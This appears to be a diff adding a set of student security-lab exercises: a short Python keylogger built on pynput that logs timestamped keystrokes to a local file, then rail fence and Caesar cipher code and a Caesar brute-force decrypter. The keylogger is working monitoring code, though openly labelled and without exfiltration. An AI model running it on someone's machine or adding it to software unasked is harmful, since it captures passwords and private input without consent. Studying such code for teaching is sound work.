@@ -1,0 +1,137 @@
+keylogger
+
+#pip3 install pynput on terminal
+
+
+from pynput.keyboard import Listener, Key
+import logging
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+------------------------------------------------------------------------------------------------------------------------
+
+railfence
+
+import string
+from collections import Counter
+
+alphabet = string.ascii_letters
+
+plain = "Daivik is a god"
+renc = "xesetiibs"
+
+def rail_fence_encrypt(text, key=2):
+    if key != 2:
+        print("Invalid key")
+        return
+    text = text.replace(" ", "")
+    block1 = text[::2]
+    block2 = text[1::2]
+    res = block1 + block2
+    print("Rail Fence encryption:", res)
+    return res
+
+def rail_fence_decrypt(cipher, key=2):
+    if key != 2:
+        print("Invalid key")
+        return
+    cipher = cipher.replace(" ", "")
+    n = len(cipher)
+    mid = (n + 1) // 2  # top rail gets extra char if odd
+    block1 = cipher[:mid]
+    block2 = cipher[mid:]
+    text = ''
+    for i in range(len(block2)):
+        text += block1[i] + block2[i]
+    if len(block1) > len(block2):
+        text += block1[-1]
+    print("Rail Fence decryption:", text)
+    return text
+
+
+
+rf_encrypted = rail_fence_encrypt(plain, 2)
+rail_fence_decrypt(rf_encrypted, 2)
+
+# Decrypt using manually entered cipher
+rail_fence_decrypt(renc, 2)
+
+------------------------------------------------------------------------------------------------------------------------
+
+ceasar
+
+import string
+from collections import Counter
+
+alphabet = string.ascii_letters
+plain = "Daivik is a god"
+
+def ceasar(plain):
+    key = 3
+    cipher = []
+    mapd = {}
+
+    for i in range(len(alphabet)):
+        mapd[alphabet[i]] = alphabet[(i + key) % len(alphabet)]
+
+    for c in plain:
+        cipher.append(mapd[c] if c in alphabet else c)
+
+    res = ''.join(cipher)
+    print("The Caesar cipher encryption is:", res)
+    return res
+
+def c_decrypt(encrypted):
+    key = 3
+    cipher = []
+    mapd = {}
+
+    for i in range(len(alphabet)):
+        mapd[alphabet[i]] = alphabet[(i - key) % len(alphabet)]
+
+    for c in encrypted:
+        cipher.append(mapd[c] if c in alphabet else c)
+
+    res = ''.join(cipher)
+    print("The Caesar cipher decryption is:", res)
+
+
+enc = ceasar(plain)
+c_decrypt(enc)
+
+
+---------------------------------------------------------------------------------------------------------
+
+ceasar brute firce decrypt
+
+import string
+from collections import Counter
+
+alphabet = string.ascii_letters
+plain = "ALH LV EHVW"
+
+    
+def bfcaesar(cipher_text):
+    for key in range(1, 26):
+        decrypted = []
+        for c in cipher_text:
+            if c in alphabet:
+                start = ord('A') if c.isupper() else ord('a')
+                decrypted.append(chr((ord(c) - start - key) % 26 + start))
+            else:
+                decrypted.append(c)
+        print(f"Key {key}: {''.join(decrypted)}")
+
+        
+
+bfcaesar(plain)
